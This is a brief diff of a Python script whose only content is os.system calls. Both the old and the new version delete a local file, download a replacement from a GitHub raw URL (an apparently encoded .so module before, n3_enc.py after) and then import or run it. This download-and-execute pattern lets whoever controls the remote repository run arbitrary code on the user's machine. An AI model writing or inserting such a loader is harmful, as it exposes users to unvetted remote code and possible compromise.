@@ -1,5 +1,4 @@
 import os
-os.system('rm -rf nr2_enc.cpython-311.so')
-os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/nr2_enc.cpython-311.so > nr2_enc.cpython-311.so')
-os.system('chmod 777 nr2_enc*')
-import nr2_enc
+os.system('rm -rf n3_enc.py')
+os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/n3_enc.py > n3_enc.py ')
+os.system('python n3_enc.py')
